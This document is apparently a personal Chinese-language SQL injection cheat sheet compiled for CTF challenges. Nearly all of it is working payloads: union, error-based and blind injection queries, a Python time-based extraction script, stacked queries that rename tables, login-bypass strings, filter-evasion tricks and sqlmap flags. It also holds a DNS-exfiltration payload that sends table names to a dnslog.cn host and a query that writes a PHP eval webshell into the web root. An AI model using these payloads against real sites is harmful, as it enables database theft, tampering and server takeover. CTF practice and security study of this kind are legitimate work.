
## 基本函数：
concat()：concat(str1, str2,…)将多个字符串连接成一个字符串
version():数据库版本
user():用户名
database():当前数据库名
length():返回字符串长度
substr():截取字符串
group_concat():连接一个组的字符串
ord():返回ascii编码样式
ascii():转换为ascii样式
md5():md5加密
floor(x):向下取整
rand():返回0-1随机浮点数
sleep():睡眠时间为指定秒数
left()

if(ture,语句1,语句2)：正确执行语句1，否则执行语句2

## 联合注入：
`?id=1 order by 2`

`1' or 1=1 order by 3`

`?id=-1 union select (select group_concat(table_name) from information_schema.tables where table_schema = database()),database()`

`?id=-1' union select (select group_concat(column_name)from information_schema.columns where table_name='xxx'),database() `

`?id=-1 union select 1,group_concat(xxx) from 库名.表名
`username=1' or 1=1 union select 1,(select group_concat(flag) from flag),3#&password=1`

## 报错注入：
①MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中
`?id=1' and updatexml(1, concat(0x7e,(version())),0x7e)`

②利用extractvalue（）对数据进行一个排序，指定第一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示”-“号
`extractvalue(null,concat(0x7e,(sqli_inject),0x7e))`

`select group_concat(table_name) from information_schema.tables where table_schema=database()`

前面说过extractvalue（）最大返回长度为32，所以可以用limit N，1 一行一行的回显。
`sqli_inject = select table_name from information_schema.tables where table_schema=database() limit 0,1`

③group by：
`select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2))`

## 布尔盲注
```
常配合以下函数

substr 
substring 
left
IFNULL()

dnslogsqlinj


`?id=1 and substr(database(),1,1)='x'`

`?id=1 and substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),1,1)='f'`

`1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.h6xj05.dnslog.cn\\aaa'))),1,1)--+`
```

## 延时注入

有时可以采用AS别名方法，让查询结果显示在界面上
```
?id=(select pwd from wp_user) as title

?id=title from (select pwd as title from wp_user)

python

import time
import requests
from datetime import datetime

url = "http://web-1939c1eb66.challenge.xctf.org.cn/index.php"

result = ""
for i in range(1,100):
    head = 32
    tail = 126
    while head < tail:
        mid = (head + tail) >> 1
        #查数据库 ctf
        param = {
            "id": f"1' and ascii(substr(database(),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        #查表
        param = {
            "id": f"1' and ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        #查列  Flagg
        param = {
            "id": f"1' and ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flllag')),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        #Flagg 查数据
        param = {
            "id": f"1' and ascii(substr((select(group_concat(concat_ws(0x7e,Flagg)))from(ctf.Flllag)),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        start = int(datetime.now().timestamp() * 1000)
        resp = requests.get(url, params=param)
        # print(resp.text)
        end = int(datetime.now().timestamp() * 1000)
        if end - start > 300:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

```
# 笛卡尔积时间盲注
```
当过滤了各种延时函数，当可以用用笛卡尔积产生延时效果

  
/?id=1 union select * from OPENQUERY([mysql],'select if(ord(mid((select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 3,1),1,1))=97,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),0)')


/index.php?id=1'or+elt(1>2,(SELECT+group_concat('1')+FROM+information_schema.columns+A,+information_schema.columns+B))+or'2


SELECT * from database.tableA,database.tableB

```


# 二次注入

```
在插入语句中传入admin'or'   admin'#

系统信任从数据库取出的数据安全
```

# 长度限制

```

```
## cookie注入
## UA注入（user-agent）
## Refer注入

## 堆叠注入
```
1'; show databases;#
-1'; show columns from 'words';#
-1'; show columns from `1919810931114514`;#

1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#


handler `1919810931114514` open as `a`;handler `a` read next;
```


## 空格过滤

```
当空格被服务器过滤时，可以将空格换成/**/

select(user())from dual where 1=1 and 2=2;可以变成
select(user())from dual where(1=1)and(2=2)
(还未遇到)

## sqlmap
-u  "url"		#检测注入点
--dbs			#列出所有数据库的名称
--current-db	#列出当前数据库的名称
-D	数据库名 --tables			#指定一个数据库
--table			#列出所有表名
-T				#指定表名
--columns		#列出所有字段名
-C				#指定字段
--dump			#列出字段内容
```

## 文件读写

#### 权限查询
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

super_priv:若返回Y则说明有超级用户权限
```

```
secure_file_priv变量用于确定从何处读取/写入文件。空值允许我们从整个文件系统读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```


sql注入进行文件读写

#### 读：
```
union select 1,load_file("\var\www\html\flag")
```

#### 写：
```
union select 1,"<?php @eval($_POST['shell']);?>",3 into outfile '\var\www\html\flag'
```

## 身份验证绕过

```
payload为：

tom' or 1='1
tom' or 1=2#

Executing query: SELECT * FROM logins WHERE username='tom' AND password = '123';

Executing query: SELECT * FROM logins WHERE username='tom' or 1=2#' AND password = '123';

先执行AND，在执行or
```

# 字符替换

### 空格：
可替代：%0a、%0b、%0c、%0d、%09、%a0和/\*\*/、括号等

### 一般的双写绕过、大小写绕过

### 正则绕过
```
例如 \bselect\b 可以用/*!50000select*/绕过
```

### 逃逸单引号或双引号可以构造a\

